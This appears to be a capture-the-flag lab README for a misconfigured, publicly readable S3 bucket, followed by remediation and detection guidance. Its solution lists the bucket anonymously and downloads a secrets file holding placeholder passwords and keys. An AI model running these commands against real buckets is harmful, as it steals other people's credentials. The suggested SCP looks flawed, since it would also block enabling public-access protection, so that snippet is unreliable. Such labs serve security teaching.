# Challenge 01: Misconfigured S3 Bucket

**Difficulty:** 🟢 Easy  
**Category:** Storage  
**MITRE ATT&CK:** [T1530 - Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/)

---

## 🎯 Objective

A developer accidentally left an S3 bucket publicly accessible. The bucket contains sensitive application configuration files. Find the flag hidden inside.

---

## 🌍 Setup

```bash
cd challenges/01-misconfigured-s3/terraform
terraform init && terraform apply
# Note the bucket_name from the output
```

---

## 💡 Hints

<details>
<summary>Hint 1</summary>
S3 buckets can be listed and accessed publicly if misconfigured. Try enumerating the bucket contents using the AWS CLI without credentials.
</details>

<details>
<summary>Hint 2</summary>
Use `aws s3 ls` with `--no-sign-request` to list objects in a public bucket without needing AWS credentials.
</details>

<details>
<summary>Hint 3</summary>
The flag isn't in the obvious top-level files. Check all "directories" (prefixes) recursively. Developers often hide sensitive configs in subdirectories.
</details>

---

## ✅ Solution

### Step 1 — Enumerate the bucket (no credentials needed)

```bash
# List all objects in the bucket
aws s3 ls s3://<bucket_name> --recursive --no-sign-request
```

You'll see output like:
```
2024-01-01  43 public/readme.txt
2024-01-01  67 logs/access.log
2024-01-01 198 internal/config/app-secrets.json   ← interesting!
```

### Step 2 — Read the sensitive file

```bash
aws s3 cp s3://<bucket_name>/internal/config/app-secrets.json - --no-sign-request
```

Output:
```json
{
  "db_password": "sup3r$ecretP@ss",
  "api_key": "sk-prod-1234567890abcdef",
  "flag": "CTF{public_s3_data_exfil_success}",
  "environment": "production"
}
```

🚩 **Flag:** `CTF{public_s3_data_exfil_success}`

---

## 🔍 MITRE ATT&CK Mapping

| Field | Detail |
|---|---|
| Tactic | Collection, Exfiltration |
| Technique | T1530 — Data from Cloud Storage Object |
| Sub-technique | N/A |
| Detection | CloudTrail: `GetObject` events from unauthenticated principals |

---

## 🛠️ Remediation

### Fix 1 — Enable S3 Block Public Access (highest priority)

```bash
aws s3api put-public-access-block \
  --bucket <bucket_name> \
  --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

### Fix 2 — Remove the public bucket policy

```bash
aws s3api delete-bucket-policy --bucket <bucket_name>
```

### Fix 3 — Terraform fix (secure version)

```hcl
resource "aws_s3_bucket_public_access_block" "secure" {
  bucket = aws_s3_bucket.secure.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

### Fix 4 — Preventive control (SCP)

Apply this SCP at the OU level to prevent any S3 bucket from ever being made public:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPublicS3",
      "Effect": "Deny",
      "Action": [
        "s3:PutBucketPublicAccessBlock",
        "s3:PutBucketPolicy"
      ],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "s3:ResourceAccount": "${aws:PrincipalAccount}"
        }
      }
    }
  ]
}
```

### Detection rule (CloudWatch)

```json
{
  "source": ["aws.s3"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["GetObject"],
    "userIdentity": {
      "type": ["Anonymous"]
    }
  }
}
```

---

## 📚 Further Reading

- [AWS S3 Block Public Access](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html)
- [MITRE T1530](https://attack.mitre.org/techniques/T1530/)
